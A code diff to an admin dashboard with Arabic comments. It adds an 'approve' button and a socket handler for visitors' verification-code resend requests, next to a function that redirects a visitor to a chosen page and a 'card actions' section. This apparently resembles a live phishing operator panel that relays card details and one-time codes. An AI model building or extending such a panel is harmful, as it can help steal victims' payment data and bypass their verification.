@@ -1288,6 +1288,13 @@
               html += '</div>';
             }
             
+            // إضافة زر موافقة لطلب إعادة إرسال الرمز
+            if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button onclick="approveResendCode(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '</div>';
+            }
+            
             html += '</div>';
           }
         });
@@ -1441,6 +1448,11 @@
     // دالة تحويل الزائر لصفحة محددة مباشرة
     function navigateVisitorToPage(socketId, page) {
       socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+    }
+
+    // دالة الموافقة على طلب إعادة إرسال الرمز
+    function approveResendCode(socketId) {
+      socket.emit('admin:approveResend', { visitorSocketId: socketId });
     }
 
     // Card action functions
